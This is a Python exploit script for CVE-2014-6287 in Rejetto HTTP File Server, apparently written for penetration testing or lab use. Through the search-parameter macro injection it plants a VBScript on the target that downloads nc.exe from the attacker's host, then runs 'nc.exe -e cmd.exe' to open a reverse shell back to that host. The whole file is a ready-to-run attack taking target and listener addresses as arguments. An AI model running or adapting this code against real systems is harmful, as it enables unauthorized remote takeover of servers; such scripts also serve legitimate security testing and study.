import argparse
import sys
import urllib.request
import urllib.parse
from log_colors import *

# CVE-2014-6287
# The findMacroMarker function in parserLib.pas 
# in Rejetto HTTP File Server (aks HFS or HttpFileServer) 
# 2.3x before 2.3c allows 
# remote attackers to execute arbitrary programs 
# via a %00 sequence in a search action. 
class CVE2014_6287:

    def __init__(self, rhost, rport, lhost, lport):
        self.rhost, self.rport = rhost, rport
        self.lhost, self.lport = lhost, lport

    # create scripts
    def create_scripts(self):
        print (LogColors.BLUE + "create scripts..." + LogColors.ENDC)
        vbscript = r'C:\Users\Public\script.vbs'
        ncdownurl = "http://" + self.lhost + ":9000/nc.exe"
        ncpathsave = r'C:\Users\Public\nc.exe'
        exe1 = "exec|" + "cscript.exe " + vbscript
        exe2 = "exec|" + ncpathsave + " -e cmd.exe " + self.lhost + " " + self.lport
        save = 'save|' + vbscript + '|dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")\n'
        save += 'dim bStrm: Set bStrm = createobject("Adodb.Stream")\n'
        save += 'xHttp.Open "GET", "' + ncdownurl + '", False\n'
        save += 'xHttp.Send\n\n'
        save += 'with bStrm\n'
        save += "\t.type = 1 '//binary\n"
        save += '\t.open\n'
        save += '\t.write xHttp.responseBody\n'
        save += '\t.savetofile "' + ncpathsave + '", 2 \'//overwrite\n'
        save += 'end with\n'
        save += ''
        self.exe1, self.exe2, self.save = exe1, exe2, save
    
    # create vbs wget nc.exe
    def script_create(self):
        print (LogColors.BLUE + "script create..." + LogColors.ENDC) 
        url = "http://" + self.rhost + ":" + self.rport + "/?search=%00{.+" + urllib.parse.quote(self.save) + ".}"
        print (LogColors.YELLOW + url + LogColors.ENDC)
        urllib.request.urlopen(url)

    # script execute
    def script_execute(self):
        print (LogColors.BLUE + 'script execute...' + LogColors.ENDC)
        url = "http://" + self.rhost + ":" + self.rport + "/?search=%00{.+" + urllib.parse.quote(self.exe1) + ".}"
        print (LogColors.YELLOW + url + LogColors.ENDC)
        urllib.request.urlopen(url)
    
    # run netcat
    def run_nc(self):
        print (LogColors.YELLOW + "run nc..." + LogColors.ENDC)
        url = "http://" + self.rhost + ":" + self.rport + "/?search=%00{.+" + urllib.parse.quote(self.exe2) + ".}"
        print (LogColors.YELLOW + url + LogColors.ENDC)
        urllib.request.urlopen(url)

    # exploit
    def exploit(self):
        self.create_scripts()
        print (LogColors.BLUE + "run exploit..." + LogColors.ENDC)
        try:
            self.script_create()
            self.script_execute()
            self.run_nc()
            print (LogColors.GREEN + "successfully exploit. hacked :)" + LogColors.ENDC)
        except Exception as e:
            print (str(e))
            print (LogColors.RED + "failed :(" + LogColors.ENDC)
            sys.exit()

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-r','--rhost', required = True, help = "target host")
    parser.add_argument('-rp','--rport', required = True, help = "target port")
    parser.add_argument('-l', '--lhost', required = True, help = "shell listener host")
    parser.add_argument('-p', '--lport', required = True, help = "port listener")
    args = vars(parser.parse_args())
    rhost, rport = args['rhost'], args['rport']
    lhost, lport = args['lhost'], args['lport']
    cve = CVE2014_6287(rhost, rport, lhost, lport)
    cve.exploit()

